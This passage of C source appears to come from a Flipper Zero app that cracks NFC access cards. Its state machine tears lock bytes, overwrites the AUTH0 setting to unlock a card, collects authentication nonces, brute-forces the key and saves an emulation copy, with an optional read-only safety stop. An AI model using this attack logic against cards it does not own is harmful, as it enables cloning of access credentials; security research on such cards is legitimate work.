                            app->state = AppStateError;
                            app->error = "Backup checkpoint failed";
                        } else {
                            app->state = AppStateCrackTearLockbytes;
                        }
                    }
                } else {
                    app->state = AppStateCrackTearLockbytes;
                }
#else
                // fork SAFETY: collect read-only proof, then stop before any card write.
                app->auth_read_ok = dump_authenticated_pages(&furi_hal_spi_bus_handle_nfc, app);
                app->auth_ok_safe_stop = true;
                notification_message(app->notifications, &sequence_success);
                app->state = AppStateComplete;
#endif
            } else if(app->card_present) {
                app->auth_attempts++; // fork: UI progress
            }
        } else if(app->state == AppStateCrackTearLockbytes) {
            // Tear the lock bytes. Only if needed, read the lock bytes first.
            app->tear_attempts++; // fork: UI progress
            if(attempt_tear_lockbytes(&furi_hal_spi_bus_handle_nfc, app)) {
                ulcfkey_session_save(app);
                app->state = AppStateCrackOverwriteAuth0;
            } else {
                // Auth reset
                app->tear_delay++;
                setup_nfc_field(&furi_hal_spi_bus_handle_nfc);
                app->field_active = true;
                app->state = AppStateCrackInitialAuth;
            }
        } else if(app->state == AppStateCrackOverwriteAuth0) {
            // Overwrite AUTH0 to 30
            if(overwrite_auth0_config(&furi_hal_spi_bus_handle_nfc, app)) {
                FURI_LOG_I(TAG, "Card unlocked");
                app->session_stage = SessionStageUnlocked;
                app->session_loaded = true;
                if(ulcfkey_session_save(app)) {
                    app->state = AppStateCrackCollectNonces;
                } else {
                    app->state = AppStateError;
                    app->error = "Unlock checkpoint failed";
                }
            } else {
                app->state = AppStateError;
                app->error = "Failed to overwrite AUTH0";
                notification_message(app->notifications, &sequence_error);
            }
        } else if(app->state == AppStateCrackCollectNonces) {
            // Overwrite the key and collect 100, 75, 50, 25 nonces
            if(collect_nonces(&furi_hal_spi_bus_handle_nfc, app)) {
                if(save_nonces_to_file(app)) {
                    do_shutdown(app);
                    ulcfkey_brute_init(&app->brute);
                    app->session_stage = SessionStageBruteforce;
                    app->brute_last_checkpoint = 0;
                    app->session_loaded = true;
                    if(!ulcfkey_session_save(app)) {
                        app->state = AppStateError;
                        app->error = "Recovery checkpoint failed";
                    } else {
                        app->state = AppStateRecoverKeyReady;
                    }
                    notification_message(app->notifications, &sequence_blink_stop);
                    notification_message(app->notifications, &sequence_success);
                } else {
                    app->state = AppStateError;
                    app->error = "Failed to save recovery log";
                    notification_message(app->notifications, &sequence_error);
                }
            } else {
                app->state = AppStateError;
                app->error = "Failed to collect nonces";
                notification_message(app->notifications, &sequence_error);
            }
        } else if(app->state == AppStateCrackResumeInit) {
            notification_message(app->notifications, &sequence_blink_start_cyan);
            furi_hal_spi_acquire(&furi_hal_spi_bus_handle_nfc);
            app->spi_held = true;
            setup_nfc_field(&furi_hal_spi_bus_handle_nfc);
            app->field_active = true;
            if(!verify_session_card(&furi_hal_spi_bus_handle_nfc, app)) {
                app->state = AppStateError;
                app->error = "Wrong card / UID";
                do_shutdown(app);
            } else {
                app->state = AppStateCrackCollectNonces;
            }
        } else if(app->state == AppStateRecoverKeyRunning) {
            app->anim_tick++;
            uint8_t targets[4][8];
            memcpy(targets[0], app->nonce_100, 8);
            memcpy(targets[1], app->nonce_75, 8);
            memcpy(targets[2], app->nonce_50, 8);
            memcpy(targets[3], app->nonce_25, 8);
            bool milestone =
                ulcfkey_brute_step(&app->brute, app->brute_runtime, targets, 2048);
            if(milestone ||
               app->brute.next_candidate - app->brute_last_checkpoint >= (1UL << 20)) {
                app->brute_last_checkpoint = app->brute.next_candidate;
                app->session_stage = app->brute.complete ? SessionStageKeyRecovered :
                                                           SessionStageBruteforce;
                if(!ulcfkey_session_save(app)) {
                    app->state = AppStateError;
                    app->error = "Brute checkpoint failed";
                }
                if(milestone && !app->brute.complete) {
                    app->brute_run_start_tick = furi_get_tick();
                    app->brute_run_start_candidate = 0;
                }
            }
            if(app->brute.complete && app->state == AppStateRecoverKeyRunning) {
                if(save_recovered_emulation(app)) {
                    app->session_stage = SessionStageEmulationSaved;
                    ulcfkey_session_save(app);
                    app->state = AppStateComplete;
                    notification_message(app->notifications, &sequence_success);
                } else {
                    app->state = AppStateError;
                    app->error = "Emulation save failed";
                }
            }
        } else if(app->state == AppStateRestoreRunning) {
            notification_message(app->notifications, &sequence_blink_start_cyan);
            furi_hal_spi_acquire(&furi_hal_spi_bus_handle_nfc);
            app->spi_held = true;
            setup_nfc_field(&furi_hal_spi_bus_handle_nfc);
            app->field_active = true;
            bool restored = restore_physical_card(&furi_hal_spi_bus_handle_nfc, app);
            do_shutdown(app);
            if(restored) {
                app->state = AppStateComplete;
                notification_message(app->notifications, &sequence_success);
            } else {
                app->state = AppStateError;
                notification_message(app->notifications, &sequence_error);
            }
        }

        view_port_update(app->view_port);
    }

    do_shutdown(app);
    notification_message(app->notifications, &sequence_reset_rgb);
    notification_message(app->notifications, &sequence_reset_vibro);
    notification_message_block(app->notifications, &sequence_empty);
    view_port_enabled_set(app->view_port, false);
    gui_remove_view_port(app->gui, app->view_port);
    view_port_free(app->view_port);
    furi_record_close(RECORD_GUI);

    furi_string_free(app->help_state->text);
    free(app->help_state);
    furi_message_queue_free(app->event_queue);
    furi_record_close(RECORD_NOTIFICATION);

    ulcfkey_brute_runtime_free(app->brute_runtime);
    free(app);
    return 0;
}

#pragma GCC diagnostic pop
